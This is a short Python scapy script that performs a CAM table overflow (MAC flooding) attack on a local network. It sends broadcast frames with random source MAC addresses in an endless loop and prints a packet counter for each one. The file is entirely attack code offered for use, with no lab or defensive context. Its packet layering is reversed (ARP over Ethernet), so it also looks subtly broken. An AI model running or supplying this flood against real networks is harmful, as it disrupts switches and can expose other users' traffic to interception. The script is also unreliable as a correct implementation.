#! /usr/bin/env python3 
from scapy.all import *
from scapy import *
import sys

def CAMtableOverflow():
    print("\033[92;3mStart Attack ...")
    e = Ether(src=RandMAC() , dst = "ff:ff:ff:ff:ff:ff")
    a = ARP(pdst="255.255.255.255",hwdst="ff:ff:ff:ff:ff:ff")
    iface = conf.route.route("0.0.0.0")[0]
    i=0
    while True:
        sendp(a/e,inter=.001,verbose=0)
        i+=1
        print(f"\033[41m PACKET \033[0m send mac tableoverflow \033[31m{iface}\033[0m count \033[31m{i}\033[0m")


CAMtableOverflow()



